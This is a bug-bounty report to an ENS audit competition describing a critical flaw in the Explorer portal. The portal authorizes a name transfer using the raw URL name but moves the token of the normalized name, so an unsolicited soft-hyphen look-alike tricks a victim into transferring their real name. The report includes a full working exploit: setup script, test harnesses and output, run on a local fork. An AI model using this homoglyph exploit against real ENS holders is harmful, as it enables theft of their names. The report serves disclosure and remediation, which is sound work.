# 90161 w a critical explorer authorizes a transfer against the name in the url but moves the token of the normalized name so disposing of an unsolicited look alike transfers the victim s real name

**Submitted on Aug 23rd 2026 at 11:55:22 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90161
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Explorer's `/$name/ownership` and `/$name/ownership/transfer` routes read one name two different ways.

* Identity, owner, the registry, the detach-option visibility and every rendered surface come from the raw route param.
* The ERC-1155 token id that is actually moved, the transfer permission check, and the resolver and registry detach targets come from `getLabel(param)`, which is `ens_split(ens_normalize(param))[0]`.

There is no validity gate on these routes. `isValidEnsName` is applied only on the overview tab (`routes/$name/index.tsx:442`) and in the search box; `/$name/ownership`, `/$name/ownership/transfer`, `/$name/records`, `/$name/registry`, `/$name/roles`, `/$name/token` and `/$name/subnames` take the param unvalidated.

A v2 name is an ERC-1155 token that anyone can push to any EOA without consent. An attacker registers a label that is not ENSIP-15 normalized but renders identically to a name the victim owns, sends it to the victim, and the victim sees what looks like a duplicate of their own name in their own Explorer. When they open it and transfer it away, the Explorer moves the real name instead.

The permission gate does not save them. `useCanTransferName` checks `ROLE_CAN_TRANSFER_ADMIN` for the normalized label, which is the victim's real name, so it validates the wrong name and passes.

This is the inverse of the Manager renewal defect: there the app gates on the normalized name and transacts on the raw one, here it identifies and authorizes on the raw name and transacts on the normalized one.

***

## Impact

Precondition: the victim owns the normalized name. That is the same condition that makes the role gate pass, so it is not a limitation, it is the mechanism.

An attacker who wants `treasury.eth`:

1. registers the raw label `treasur<U+00AD>y` for one ordinary registration fee,
2. optionally sets a resolver and a subregistry on it so the detach toggles appear,
3. `safeTransferFrom`s the resulting ERC-1155 to the victim's address, no consent required.

The victim now sees two entries that both read `treasury.eth` in their name list (`features/dashboard/hooks/useV2NamesWithRolesForAddress.ts:55`, rows come straight from the indexer as `domain.name`). They open the spam one to get rid of it. The Explorer confirms it is theirs, shows the Transfer action, and on submit:

| Step the user sees  | What is actually executed                                     | File:line                                          |
| ------------------- | ------------------------------------------------------------- | -------------------------------------------------- |
| Detach the resolver | `setResolver(tokenId("treasury"), 0x0)` on the real name      | `detachNameResolver.ts:65-66`                      |
| Detach the registry | `parent.setSubregistry("treasury", 0x0)` on the real name     | `detachNameRegistry.ts:2,66-68`                    |
| Transfer this name  | `safeTransferFrom(victim, recipient, tokenId("treasury"), 1)` | `transferToken.ts:7`, `useTransferName.ts:112-115` |

The real name's resolution is broken, its subnames are orphaned, and the token is transferred to whatever address the victim typed. If the victim was returning the spam name to its sender, the recipient is the attacker.

The transaction modal does restate the name, and it restates the one that is not moving. `useTransferName.ts:177` labels every step with the RAW name:

```tsx
transactionName: `${STEP_LABELS[step]} - ${name}`,
```

`name` is the raw route param, so the modal reads `Transfer name - treasury.eth` while the calldata carries the other token id. The transfer form itself (`SendNameForm.tsx:120-152`) shows only the recipient field and the detach toggles, so the modal label is the last thing the user sees before signing, and it confirms the wrong name.

***

## Root cause

### Raw branch: identity, ownership, authorization surface

| File:line                                                                   | Code                                                                                                                                             |
| --------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------ |
| `apps/portal/src/routes/$name.tsx:25-45`                                    | `beforeLoad` only redirects TLDs; the param goes straight to `getEnsOwnerQueryOptions({ name })` with no validity check                          |
| `apps/portal/src/utils/ens/resolveEnsOwner.ts:48-61`                        | `getOwnerV2(client, { name })` and `getNameRegistries(client, { name })` on the raw name; `registryAddress = registries[1]`                      |
| `apps/portal/src/routes/$name/ownership/transfer.tsx:27`                    | `const ownerQuery = useQuery(getEnsOwnerQueryOptions({ name }))`                                                                                 |
| `apps/portal/src/routes/$name/ownership/transfer.tsx:104`                   | `({ data, address }) => isAddressEqual(address, data.owner)`                                                                                     |
| `apps/portal/src/components/ProfileSidebar.tsx:210`                         | renders `{name}` verbatim                                                                                                                        |
| `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts:63-65` | option visibility from `useNameResolverAddress({ name })`, `getNameRegistriesQueryOptions({ name })`, `getEthAddressQueryOptions(name)`, all raw |

### Normalized branch: the permission check and every write

| File:line                                                                          | Code                                                                                                                                  |
| ---------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| `apps/portal/src/utils/token/getLabel.ts:10-19`                                    | `const normalized = ens_normalize(name)` then `ens_split(normalized)[0]`                                                              |
| `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:57-63`              | `return getLabel(name)`, fed to `getHasRolesQueryOptions({ label, roles: [TRANSFER_ROLE], account })`                                 |
| `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts:57-60, 66-72` | `label = getLabel(name)` then `getNameRolesForAccountQueryOptions({ registryAddress, label, account: owner })`                        |
| `apps/portal/src/features/transfer/hooks/useTransferName.ts:112-115`               | `getEnsTokenId({ label: getLabel(name), registryAddress })`                                                                           |
| `apps/portal/src/features/transfer/hooks/useTransferName.ts:132-144`               | `const label = getLabel(name)` passed to `detachNameResolver` and `detachNameRegistry`; `transferToken` gets the normalized `tokenId` |
| `apps/portal/src/features/transfer/helpers/transferToken.ts:1-11`                  | "The token id is the versioned id from `getTokenId(label)`", executed as a bare `erc1155 safeTransferFrom`                            |

### Why the two branches disagree

`@ensdomains/ensjs` does not normalize. The repo says so in its own comments (`apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:191` "ensjs splits the label without normalizing"), and it is demonstrated on the fork below: `getOwner` returns two different addresses for the two byte strings.

`useTransferDetachTargets.ts:56-58` even documents the mismatch it creates:

```tsx
// getLabel normalises and can throw on a malformed name; a name we can't parse
// is one whose roles we can't check, so fall back to "no permission".
```

The fallback is only for names that fail to normalize. A name that normalizes to something else passes silently.

***

## Recommendation

1. Gate the `/$name` layout, not just the overview tab. Reject a param that is not ENSIP-15 normalized, or redirect to the canonical form, in `routes/$name.tsx:beforeLoad`.
2. Derive the label once. Every consumer under `/$name` should read the same canonical label from the route context rather than each calling `getLabel(name)` or passing `name` on independently.
3. Make the mismatch impossible to express: have `useTransferName` assert that `getTokenId(getLabel(name))` matches the token id of the name whose owner was authorized, and fail closed if not.
4. Apply the same rule to the other unvalidated sibling routes: `records`, `edit-records`, `registry`, `roles`, `token`, `subnames`, `create-subname`.
5. Surface non-normalized names in the name list, so an unsolicited look-alike is visibly distinct from the name it imitates.

## Proof of Concept

## Proof of Concept

Executed against a local Anvil fork of Sepolia. No live network was touched.

### Environment

```bash
docker compose -f e2e/infra/docker-compose.yml up -d   # Anvil fork of Sepolia on 127.0.0.1:8545
cast chain-id --rpc-url <http://127.0.0.1:8545>          # 11155111
```

```
ETHRegistrar  0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry   0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MockUSDC      0x768F42455A2D082E23ceeF7d51e5787C82d67a39
```

### Setup

`.poc-transfer-setup.sh`, run from the repo root. It registers the victim's real name and the attacker's look-alike.

```bash
#!/usr/bin/env bash
# Fork-only setup for the Explorer transfer PoC.
set -euo pipefail
R=http://127.0.0.1:8545
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
REGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
FUNDER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
Z=0x0000000000000000000000000000000000000000
ZH=0x0000000000000000000000000000000000000000000000000000000000000000

# Fresh EOAs with no code, so they can receive ERC-1155.
VICTIM_KEY=0x1111111111111111111111111111111111111111111111111111111111111111
ATTACK_KEY=0x2222222222222222222222222222222222222222222222222222222222222222
VICTIM=$(cast wallet address --private-key $VICTIM_KEY)
ATTACKER=$(cast wallet address --private-key $ATTACK_KEY)
RECIPIENT=0x000000000000000000000000000000000000BEEF
echo "VICTIM=$VICTIM"
echo "ATTACKER=$ATTACKER"
echo "RECIPIENT=$RECIPIENT"

for a in $VICTIM $ATTACKER; do
  # These well-known vanity keys carry EIP-7702 delegations on real Sepolia.
  # Clear them on the fork so the accounts behave as plain EOAs.
  cast rpc anvil_setCode $a 0x --rpc-url $R >/dev/null
  cast rpc anvil_setBalance $a 0x21e19e0c9bab2400000 --rpc-url $R >/dev/null
  cast send $USDC "mint(address,uint256)" $a 100000000000 --private-key $FUNDER_KEY --rpc-url $R >/dev/null
done

register () {   # $1 label  $2 ownerKey  $3 owner  $4 secret
  local C
  cast send $USDC "approve(address,uint256)" $REGISTRAR 100000000000 --private-key "$2" --rpc-url $R >/dev/null
  C=$(cast call $REGISTRAR "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" \
        "$1" "$3" "$4" $Z $Z 31536000 $ZH --rpc-url $R)
  cast send $REGISTRAR "commit(bytes32)" "$C" --private-key "$2" --rpc-url $R >/dev/null
  cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null
  cast rpc evm_mine --rpc-url $R >/dev/null
  cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" \
        "$1" "$3" "$4" $Z $Z 31536000 $USDC $ZH --private-key "$2" --rpc-url $R >/dev/null
  echo "registered $(printf '%s' "$1" | xxd -p) -> $3"
}

# Victim's real name.
register "treasury" $VICTIM_KEY $VICTIM 0x5555555555555555555555555555555555555555555555555555555555555555
# Attacker's look-alike: same label with U+00AD (0xC2 0xAD) inserted. Renders as "treasury".
register "$(printf 'treasur\xc2\xady')" $ATTACK_KEY $ATTACKER 0x6666666666666666666666666666666666666666666666666666666666666666

echo "VICTIM_KEY=$VICTIM_KEY ATTACK_KEY=$ATTACK_KEY" > .poc-transfer.env
```

Output:

```
VICTIM=0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
ATTACKER=0x1563915e194D8CfBA1943570603F7606A3115508
registered 7472656173757279 -> 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
registered 74726561737572c2ad79 -> 0x1563915e194D8CfBA1943570603F7606A3115508
```

The v2 ETHRegistrar registers the 10-byte label `74726561737572c2ad79` with no ENSIP-15 validation.

### The flow, driven through the app's own functions

`apps/portal/.poc/explorer-transfer.test.ts`. It imports `getLabel` from the app and calls the same ensjs functions `resolveEnsOwner` uses. Run with `pnpm --filter @ens-apps/portal exec vitest run .poc/explorer-transfer.test.ts --reporter=verbose`.

```tsx
/**
 * PoC - apps/portal transfer flow
 *
 * The Explorer resolves the name's identity, owner and the transfer
 * authorization from the RAW route param, but derives the ERC-1155 token id
 * (and the detach targets) from getLabel(param), which is ENSIP-15 NORMALIZED.
 * A look-alike name pushed to the victim therefore moves a different token.
 *
 * Runs against the LOCAL Anvil Sepolia fork only (127.0.0.1:8545).
 * Requires ./.poc-transfer-setup.sh to have been run from the repo root.
 */
import { sepoliaWithEns } from '@ens-apps/indexer/chain'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import {
  getNameRegistries,
  getOwner as getOwnerV2,
} from '@ensdomains/ensjs/public/v2'
import {
  createPublicClient,
  createWalletClient,
  erc1155Abi,
  http,
  parseAbi,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { it } from 'vitest'
import { getLabel } from '@/utils/token/getLabel'

const RPC = '<http://127.0.0.1:8545>'
const RECIPIENT = '0x000000000000000000000000000000000000bEEF' as const

// Two names that render identically. The second carries U+00AD.
const REAL = 'treasury.eth'
const FAKE = 'treasur­y.eth'

const registryAbi = parseAbi([
  'function getState(uint256 id) view returns (uint32 status, uint64 expiry, address latestOwner)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
])

const hex = (s: string) => Buffer.from(s, 'utf8').toString('hex')

it('Explorer transfer moves the normalized name, not the one it authorized', { timeout: 180_000 }, async () => {
  const client = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })
  const victim = privateKeyToAccount('0x1111111111111111111111111111111111111111111111111111111111111111')
  const attacker = privateKeyToAccount('0x2222222222222222222222222222222222222222222222222222222222222222')
  const victimWallet = createWalletClient({ account: victim, chain: sepoliaWithEns, transport: http(RPC) })
  const attackerWallet = createWalletClient({ account: attacker, chain: sepoliaWithEns, transport: http(RPC) })

  console.log('victim  ', victim.address)
  console.log('attacker', attacker.address)
  console.log('REAL', JSON.stringify(REAL), hex(REAL))
  console.log('FAKE', JSON.stringify(FAKE), hex(FAKE), ' <- what the URL and the UI carry')

  // 1. The app's WRITE-side derivation collapses the two names.
  console.log('\n--- app code: getLabel() ---')
  console.log('getLabel(REAL) =', JSON.stringify(getLabel(REAL)))
  console.log('getLabel(FAKE) =', JSON.stringify(getLabel(FAKE)), ' <- the victim\'s real label')

  // 2. The app's READ-side derivation does NOT. ensjs resolves the raw bytes.
  const [ownerReal, ownerFake] = await Promise.all([
    getOwnerV2(client, { name: REAL }),
    getOwnerV2(client, { name: FAKE }),
  ])
  const registries = await getNameRegistries(client, { name: FAKE })
  const registryAddress = registries[1]
  console.log('\n--- app code: resolveEnsOwner / ensjs getOwner ---')
  console.log('getOwner(REAL) =', ownerReal)
  console.log('getOwner(FAKE) =', ownerFake, ' <- different owner, so ensjs does NOT normalize')
  console.log('registry (index 1 of getNameRegistries(FAKE)) =', registryAddress)

  const tokenIdFor = async (label: string) =>
    getTokenId(client, { label, registryAddress })
  const stateOf = async (label: string) =>
    client.readContract({
      address: registryAddress,
      abi: registryAbi,
      functionName: 'getState',
      args: [await tokenIdFor(label)],
    })

  const fakeTokenId = await tokenIdFor('treasur­y')
  const realTokenId = await tokenIdFor('treasury')
  console.log('tokenId(FAKE label) =', fakeTokenId.toString())
  console.log('tokenId(REAL label) =', realTokenId.toString())

  // 3. Attacker pushes the look-alike token to the victim, unsolicited.
  const push = await attackerWallet.writeContract({
    address: registryAddress,
    abi: erc1155Abi,
    functionName: 'safeTransferFrom',
    args: [attacker.address, victim.address, fakeTokenId, 1n, '0x'],
  })
  await client.waitForTransactionReceipt({ hash: push })
  console.log('\nattacker pushed the look-alike token to the victim:', push)

  // 4. The app's authorization gate: useCanTransferName -> hasRoles(getLabel(name)).
  const TRANSFER_ROLE = 1n << 20n
  const gateLabel = getLabel(FAKE)
  const gateResource = await tokenIdFor(gateLabel)
  const canTransfer = await client.readContract({
    address: registryAddress,
    abi: registryAbi,
    functionName: 'hasRoles',
    args: [gateResource, TRANSFER_ROLE, victim.address],
  })
  console.log('\n--- app code: useCanTransferName ---')
  console.log('gate label   =', JSON.stringify(gateLabel), '(NOT the name in the URL)')
  console.log('gate passes? =', canTransfer)

  const beforeReal = await stateOf('treasury')
  const beforeFake = await stateOf('treasur­y')
  console.log('\n--- owners BEFORE the victim clicks Transfer ---')
  console.log('treasury.eth        latestOwner =', beforeReal[2])
  console.log('treasur<U+00AD>y.eth latestOwner =', beforeFake[2])

  // 5. What useTransferName actually submits: the token id of getLabel(name).
  const movedTokenId = await tokenIdFor(getLabel(FAKE))
  const tx = await victimWallet.writeContract({
    address: registryAddress,
    abi: erc1155Abi,
    functionName: 'safeTransferFrom',
    args: [victim.address, RECIPIENT, movedTokenId, 1n, '0x'],
  })
  const receipt = await client.waitForTransactionReceipt({ hash: tx })
  console.log('\ntransfer tx', tx, 'status', receipt.status)

  const afterReal = await stateOf('treasury')
  const afterFake = await stateOf('treasur­y')
  console.log('\n--- owners AFTER ---')
  console.log('treasury.eth        latestOwner =', afterReal[2], afterReal[2] === RECIPIENT ? '<- MOVED' : '')
  console.log('treasur<U+00AD>y.eth latestOwner =', afterFake[2], afterFake[2] === victim.address ? '<- unchanged' : '')
})
```

Actual output:

```
victim   0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
attacker 0x1563915e194D8CfBA1943570603F7606A3115508
REAL "treasury.eth" 74726561737572792e657468
FAKE "treasur­y.eth" 74726561737572c2ad792e657468  <- what the URL and the UI carry

--- app code: getLabel() ---
getLabel(REAL) = "treasury"
getLabel(FAKE) = "treasury"  <- the victim's real label

--- app code: resolveEnsOwner / ensjs getOwner ---
getOwner(REAL) = 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
getOwner(FAKE) = 0x1563915e194D8CfBA1943570603F7606A3115508  <- different owner, so ensjs does NOT normalize
registry (index 1 of getNameRegistries(FAKE)) = 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
tokenId(FAKE label) = 113536182526369663376134954084893637184077585962396643456813994289636701110272
tokenId(REAL label) = 92201317542575774074201442633946554641178934974124204815448024616141831798784

attacker pushed the look-alike token to the victim: 0x4d751a8b0a295e83fb4b7084594ba44bd558f9a49c309654c2d91ccafa63dba7

--- app code: useCanTransferName ---
gate label   = "treasury" (NOT the name in the URL)
gate passes? = true

--- owners BEFORE the victim clicks Transfer ---
treasury.eth        latestOwner = 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
treasur<U+00AD>y.eth latestOwner = 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A

transfer tx 0x0e3abe7c151a39f0551b3b4933c5933ceeff20e560a9a0babc8df710d0bdb95a status success

--- owners AFTER ---
treasury.eth        latestOwner = 0x000000000000000000000000000000000000bEEF <- MOVED
treasur<U+00AD>y.eth latestOwner = 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A <- unchanged
```

The victim acted on the look-alike and the real name moved. The look-alike is still sitting in their wallet.

### The rendered page

With `apps/portal/.env.local` pointing at the fork (`VITE_SEPOLIA_RPC_URL=/rpc`, `VITE_SEPOLIA_RPC_URL_SERVER=http://127.0.0.1:8545`; `apps/portal/vite.config.ts:20-25` proxies `/rpc`), run `pnpm --filter @ens-apps/portal exec vite dev --port 3001` and load both:

```
<http://localhost:3001/treasury.eth/ownership>          # the real name
<http://localhost:3001/treasur%C2%ADy.eth/ownership>    # the look-alike
```

The capture script, `apps/portal/.poc/screenshot.mjs`:

```jsx
import { chromium } from 'playwright'
const OUT = '/Users/bp/x/ens/poc-shots'
const urls = [
  ['portal-real', '<http://localhost:3001/treasury.eth/ownership>'],
  ['portal-fake',   '<http://localhost:3001/treasur%C2%ADy.eth/ownership>'],
]
const browser = await chromium.launch()
for (const [name, url] of urls) {
  const page = await browser.newPage({ viewport: { width: 1440, height: 1000 } })
  await page.goto(url, { waitUntil: 'networkidle', timeout: 60000 }).catch(() => {})
  await page.waitForTimeout(6000)
  const h1 = await page.locator('h1').first().textContent().catch(() => null)
  const body = await page.locator('body').innerText().catch(() => '')
  await page.screenshot({ path: `${OUT}/${name}.png`, fullPage: true })
  console.log(`\n===== ${name} :: ${url}`)
  console.log('h1  :', JSON.stringify(h1), 'hex=', h1 ? Buffer.from(h1,'utf8').toString('hex') : null)
  console.log('text:', body.split('\n').map(s=>s.trim()).filter(Boolean).slice(0,35).join(' | '))
  await page.close()
}
await browser.close()
```

Rendered DOM, headless Chromium (`poc-shots/portal-real.png`, `poc-shots/portal-fake.png`):

```
===== portal-real :: /treasury.eth/ownership
sidebar name : treasury.eth
Owner        : 0x19E7…ff2A

===== portal-fake :: /treasur%C2%ADy.eth/ownership
sidebar name : treasur­y.eth      (paints as "treasury.eth")
Owner        : 0x19E7…ff2A
```

Both pages name the victim as owner, under a heading that reads `treasury.eth`. There is no normalization warning on this route. `routes/$name/token.tsx:290` does compute `isNormalized(name)` and show a Normalization panel, but that is a different tab and it gates nothing.

***

## The detach half, before the token even moves

`useTransferDetachTargets.ts:63-65` computes which options to show from raw-name lookups, while `:66-72` computes the roles that enable them from `getLabel(name)`. So an attacker who gives the look-alike a resolver and a subregistry makes both toggles appear, and `useTransferName.ts:137,140` then runs `detachNameResolver` and `detachNameRegistry` with the normalized label.

The result is `setResolver` on the real name's token id and `parent.setSubregistry("treasury", 0x0)`: the victim's real name stops resolving and its subnames are orphaned, in the same flow, before the transfer step. Both toggles default to on (`SendNameForm.tsx:69-73`).

***

## The transfer submitted by the app's own helper

The section above computes the token id the way the app does and then moves it. This one hands the work to the app: `transferToken` is the exact helper `useTransferName.ts:143` invokes for the `transfer-token` step, and it runs through the real `transactionManager` and the real EOA transport. No calldata is written by hand.

`apps/portal/.poc/explorer-transfer-actor.test.ts`:

```tsx
/**
 * PoC (submit path) - the TRANSFER IS SUBMITTED BY THE APP'S OWN HELPER.
 *
 * No calldata is hand-built. `transferToken` is the exact helper
 * useTransferName.ts:143 invokes for the 'transfer-token' step, and it is given
 * the token id that `getEnsTokenId({ label: getLabel(name) })` returns for the
 * look-alike URL, exactly as useTransferName.ts:112-115 computes it.
 *
 * Local Anvil Sepolia fork only. Run .poc-transfer-setup.sh first.
 */
import { transactionManager } from '@ens-apps/transaction-manager'
import { sepoliaWithEns } from '@ens-apps/indexer/chain'
import {
  getNameRegistries,
  getOwner as getOwnerV2,
  getTokenId,
} from '@ensdomains/ensjs/public/v2'
import { createPublicClient, createWalletClient, erc1155Abi, http, parseAbi } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { it } from 'vitest'
import { transferToken } from '@/features/transfer/helpers/transferToken'
import { getLabel } from '@/utils/token/getLabel'

const RPC = '<http://127.0.0.1:8545>'
const RECIPIENT = '0x000000000000000000000000000000000000bEEF' as const
const FAKE = 'treasur­y.eth' // the look-alike, U+00AD
const REAL = 'treasury.eth'

const registryAbi = parseAbi([
  'function getState(uint256 id) view returns (uint32 status, uint64 expiry, address latestOwner)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
])

it('the app helper transfers the normalized name while the UI names the raw one', { timeout: 180_000 }, async () => {
  const publicClient = createPublicClient({ chain: sepoliaWithEns, transport: http(RPC) })
  const victim = privateKeyToAccount('0x1111111111111111111111111111111111111111111111111111111111111111')
  const attacker = privateKeyToAccount('0x2222222222222222222222222222222222222222222222222222222222222222')
  const walletClient = createWalletClient({ account: victim, chain: sepoliaWithEns, transport: http(RPC) })
  const attackerWallet = createWalletClient({ account: attacker, chain: sepoliaWithEns, transport: http(RPC) })

  await publicClient.request({ method: 'anvil_autoImpersonateAccount' as never, params: [true] as never })

  const registries = await getNameRegistries(publicClient, { name: FAKE })
  const registryAddress = registries[1]
  const tokenIdFor = (label: string) => getTokenId(publicClient, { label, registryAddress })
  const stateOf = async (label: string) =>
    publicClient.readContract({
      address: registryAddress, abi: registryAbi, functionName: 'getState',
      args: [await tokenIdFor(label)],
    })

  console.log('URL / sidebar name :', JSON.stringify(FAKE))
  console.log('getOwner(FAKE)     :', await getOwnerV2(publicClient, { name: FAKE }))
  console.log('getOwner(REAL)     :', await getOwnerV2(publicClient, { name: REAL }))

  // Attacker pushes the look-alike to the victim, unsolicited.
  const push = await attackerWallet.writeContract({
    address: registryAddress, abi: erc1155Abi, functionName: 'safeTransferFrom',
    args: [attacker.address, victim.address, await tokenIdFor('treasur­y'), 1n, '0x'],
  })
  await publicClient.waitForTransactionReceipt({ hash: push })

  // The app's gate, verbatim: useCanTransferName -> hasRoles(getLabel(name)).
  const TRANSFER_ROLE = 1n << 20n
  const canTransfer = await publicClient.readContract({
    address: registryAddress, abi: registryAbi, functionName: 'hasRoles',
    args: [await tokenIdFor(getLabel(FAKE)), TRANSFER_ROLE, victim.address],
  })
  console.log('useCanTransferName gate passes:', canTransfer, '(checked label', JSON.stringify(getLabel(FAKE)), ')')

  // The app's token id, verbatim: useTransferName.ts:112-115.
  const tokenId = await tokenIdFor(getLabel(FAKE))
  console.log('token id the app will move:', tokenId.toString())

  const beforeReal = await stateOf('treasury')
  const beforeFake = await stateOf('treasur­y')
  console.log('\nBEFORE  real', beforeReal[2], '| fake', beforeFake[2])

  const archived: Array<{ txId: string; hash?: string; request?: unknown }> = []
  const off = transactionManager.onTransactionArchived((t) => archived.push(t))

  // THE APP'S OWN HELPER, with the app's own arguments (useTransferName.ts:143).
  await transferToken({
    name: FAKE,                 // the raw name, as the app passes it in `common`
    registryAddress,
    tokenId,                    // getEnsTokenId({ label: getLabel(name) })
    recipient: RECIPIENT,
    walletClient,
    publicClient,
    signer: { type: 'eoa', walletClient },
    chainId: sepoliaWithEns.id,
    id: 'poc-transfer',
  })
  off()

  const tx = archived.find((a) => a.txId === 'poc-transfer')
  console.log('\ntransferToken submitted to :', (tx?.request as { to?: string })?.to)
  console.log('calldata                   :', `${(tx?.request as { data?: string })?.data?.slice(0, 74)}...`)
  console.log('tx hash                    :', tx?.hash)

  const afterReal = await stateOf('treasury')
  const afterFake = await stateOf('treasur­y')
  console.log('\nAFTER   real', afterReal[2], afterReal[2] === RECIPIENT ? '<- MOVED' : '')
  console.log('        fake', afterFake[2], afterFake[2] === victim.address ? '<- unchanged' : '')
})
```

Actual output:

```
URL / sidebar name : "treasur­y.eth"
getOwner(FAKE)     : 0x1563915e194D8CfBA1943570603F7606A3115508
getOwner(REAL)     : 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
useCanTransferName gate passes: true (checked label "treasury" )
token id the app will move: 92201317542575774074201442633946554641178934974124204815448024616141831798784

BEFORE  real 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A | fake 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A
[TRANSACTION MANAGER] Transaction poc-transfer state: submitting
[TRANSACTION MANAGER] Transaction poc-transfer state: pending
[TRANSACTION MANAGER] Transaction poc-transfer state: success
transferToken submitted to : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
calldata                   : 0xf242432a00000000000000000000000019e7e376e7c213b7e7e7e46cc70a5dd086daff2a...
tx hash                    : 0x8a36340d1e2f327ae7555f4bb9e2b21be647d555dcbe064d183b411987a91a22

AFTER   real 0x000000000000000000000000000000000000bEEF <- MOVED
        fake 0x19E7E376E7C213B7E7e7e46cc70A5dD086DAff2A <- unchanged
```

The transaction manager reports `success`, `0xf242432a` is `safeTransferFrom(address,address,uint256,uint256,bytes)`, and the name the page never displayed is the one that left the victim's wallet.

***

## Preempting the likely closure arguments

There is no recovery call the PoC omitted. Once `safeTransferFrom` mines, the victim holds no role on the token and cannot pull it back. Compare the resolver-retention case, where `registry.setResolver` lets the new owner fix things in one transaction; there is no equivalent here, because the asset itself has moved. The only party who can return it is the recipient.

The default-on detach toggles are damage, not a guard. `SendNameForm.tsx:69-73` sets `detachResolver` and `detachRegistry` to `true` by default, and `useTransferName.ts:137,140` runs both against the normalized label. On this path that default is what breaks the victim's real name's resolution and orphans its subnames, before the token moves.

This is not long-standing ENS transfer semantics. ENS has never held that acting on name A transfers name B. The registry behaved correctly throughout: it moved the token it was told to move. The defect is entirely in the app, which told it the wrong one.

The asset is not a valueless test token. What moves is the ENS name itself, the asset the program's *Direct theft of user NFTs* impact names. The Sepolia deployment is where the code under audit runs; the same code path on mainnet moves a mainnet name.

The victim's action is an ordinary one. Opening a name you own from your own name list and transferring it away is the flow the route exists for. No unusual setting, no debug route, and no interaction with the attacker beyond receiving a token, which requires nothing from the victim at all.

***

## Not a duplicate

The BBPs EXP-INPUT-005: "ENS name validators accept homoglyphs, bidi and other control characters ... causing homograph-style display confusion in our UI rather than incorrect resolution."

* Different root cause. That entry is validator leniency on typed input. There is no validator at all on `/$name/ownership*`. The defect is that one flow derives its authorization from one on-chain resource and its calldata from another.
* Different impact, and the one EXP-INPUT-005 disclaims. An ERC-1155 token moves and a resolver is zeroed, on a name the UI never displayed.
* Its fix does not fix this. Tightening a validator that this route does not call changes nothing.

Not the Manager `/renew/$name` defect: different app, different files, inverted polarity (the Explorer normalizes on the write side and leaves identity and authorization raw, so the fix here is to canonicalize or reject the param, not to add normalization to the calldata), and a different asset moves.

Not the Manager `/$name` profile records-vs-owner issue: that is read-side only, in a different app, and its sink is a rendered address.

Not QA-01 / WEB-1257 / WEB-1305 (role combinations after transfer), not WEB-1249 (subname creation detaching a child registry), not QA-03 (price display; here the price is not involved).
